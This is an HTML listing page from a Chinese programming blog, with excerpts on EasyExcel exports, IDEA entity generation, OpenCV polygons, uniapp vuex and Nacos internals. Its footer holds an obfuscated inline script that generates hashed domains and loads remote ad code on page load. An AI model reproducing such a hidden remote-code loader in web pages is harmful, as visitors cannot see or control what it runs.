	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c0201e7b4e4e3efe025823b37aeb0e4/" rel="bookmark">
			EasyExcel 如何导出大量数据 和 并发测试大量数据导出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言WriteWorkbook对象字段解析创建文件对象创建行对象写入磁盘测试10w条数据导出结论预约导出批量查询导出操作多线程并发导出测试 官方使用文档：https://alibaba-easyexcel.github.io/
前言 EasyExcel怎么避免OOM的？大量数据导出怎么处理？ WriteWorkbook对象字段解析 ExcelReaderBuilder ExcelWriterBuilder WriteWorkbook 对象 --&gt; 一个excel文件对象 相当于一个excel 通过 ExcelWriterBuilder 构建， 就是该文件的一些特性和一些基础信息（这里的不全，可以自己点进去看），后面还有继承的WriteBasicParameter 类。
public class WriteWorkbook extends WriteBasicParameter { /** * CSV(".csv"), * XLS(".xls"), * XLSX(".xlsx")	默认xlsx */ private ExcelTypeEnum excelType; /** * Default true. */ private Boolean autoCloseStream; /** * 强制使用的inputStream .Default is false */ private Boolean mandatoryUseInputStream; /** * Whether the encryption excel是否要加密, 加密需要整个读到内存进行处理，一般不用（耗费内存） */ private String password; /** * 在内存中写入excel。默认为false，创建缓存文件并最终写入excel。 * &lt;p&gt; * Comment and RichTextString are only supported in memory mode.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c0201e7b4e4e3efe025823b37aeb0e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc68e90a25ee1b968d807e7e4338b1ac/" rel="bookmark">
			Idea2022连接数据库Generate POJOs.groovy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Idea2022-1-4连接MySQL数据库5-1并快捷创建实体类 前言 最近学习用到了，在 Idea 中连接数据库，并且快捷创建实体类，中间发现了一个很重要的问题，就是 Idea 2022.1.4 他把创建实体类的按钮直接放在了别 Tools 里面，我花了将近一个小时才真正的找到，感谢我的老师。
过程中，我差点把自己的 Idea 给卸载了，但是因为配置了 Tomcat 就狠心继续往下找，功夫不负有心人，最后终于找到了。
过程说明 快捷生成实体类对象选择要生成的文件夹
最后 过程省略很多, 但是已经有人写出更详细的教程, 链接如下
idea 连接数据库详细教程（新手篇）2021版idea_勤俭节约的程序猿的博客-CSDN博客_idea2021连接数据库
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cb39652ff2be184fd977929f34c61aa/" rel="bookmark">
			python-opencv方法图上绘制多边形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 、已知点绘制边线：
代码如线如下：
from matplotlib import pyplot as plt import numpy as np import cv2 img = np.zeros((1080, 1920, 3), np.uint8) contours = np.array([[0, 0], [300, 1000], [500, 800], [900, 1000]]) cv2.polylines(img, [contours], isClosed=True, color=[0, 0, 255], thickness=5) plt.imshow(img) plt.show() 结果：
二、已知点绘制区域
此处有两种方法：fillPoly和fillConvexPoly
1、fillConvexPoly
cv2.fillConvexPoly()函数，只能用来填充凸多边形。
只需要提供凸多边形的顶点即可。
from matplotlib import pyplot as plt import numpy as np import cv2 img = np.zeros((1080, 1920, 3), np.uint8) triangle = np.array([[0, 0], [1600, 600], [400, 500]]) cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cb39652ff2be184fd977929f34c61aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3c7dbf7916d8e721fa9119af5427ec6/" rel="bookmark">
			uniapp使用vuex
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、uniapp中有自带vuex插件，直接引用即可
二、在项目中新建文件夹store,在main.js中导入
在根目录下新建文件夹store,在此目录下新建index.js文件
index.js import Vue from 'vue' import Vuex from 'vuex' Vue.use(Vuex) // 方法1（直接写） const store = new Vuex.Store({ state: { //公共的变量，这里的变量不能随便修改，只能通过触发mutations的方法才能改变 text1: 1 }, getters: { // state的计算属性 get1: state =&gt; { return state.text1 + 1 }, get2: (state, getters) =&gt; { //state ：可以访问数据 //getters：访问其他函数，等同于 store.getters return getters.get1 }, getTodoById: (state) =&gt; (value) =&gt; { return state.text1 + value } }, mutations: { //相当于同步的操作 //传递数值 add(state, n) { state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3c7dbf7916d8e721fa9119af5427ec6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78325a0d9d99518bb40bc48d1b9bed77/" rel="bookmark">
			Nacos注册中心原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		流程分析
服务实例在启动时注册到服务注册表，并在关闭时注销
服务消费者查询服务注册表，获得可用实例
服务注册中心需要调用服务实例的健康检查API来验证它是否能够处理请求
源码解读：
1、客户端注册：
在nacos-discovery的META-INF/spring.factories中包含自动装配的配置信息如下：
很多个自动配置类被加载了，其中跟服务注册有关的就是NacosServiceRegistryAutoConfiguration这个类，在NacosServiceRegistryAutoConfiguration这个类中，包含一个跟自动注册有关的Bean：
在初始化时，其父类AbstractAutoServiceRegistration也被初始化了。
AbstractAutoServiceRegistration类中，实现了ApplicationListener接口，监听Spring容器启动过程中的事件，在监听到WebServerInitializedEvent（web服务初始化完成）的事件后，执行了bind 方法。
类的关系图如下
bind方法
@Deprecated public void bind(WebServerInitializedEvent event) // 获取 ApplicationContext WebServerApplicationContext context = event.getApplicationContext(); // 判断服务的 namespace,一般都是null if(!(context instanceof ConfigurableWebServerApplicationContext) || !"management".equals(((ConfigurableWebServerApplicationContext)context).getServerNamespace())) { // 记录当前 web 服务的端口 this.port.compareAndSet(0, event.getWebServer().getPort()); // 启动当前服务注册流程 this.start(); } } start方法
if(!this.isEnabled()) { if(logger.isDebugEnabled()) { logger.debug("Discovery Lifecycle disabled. Not starting"); } ​ } else { // 当前服务处于未运行状态时，才进行初始化 if(!this.running.get()) { // 发布服务开始注册的事件 this.context.publishEvent(new InstancePreRegisteredEvent(this, this.getRegistration())); // 开始注册 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78325a0d9d99518bb40bc48d1b9bed77/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/232/">«</a>
	<span class="pagination__item pagination__item--current">233/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/234/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>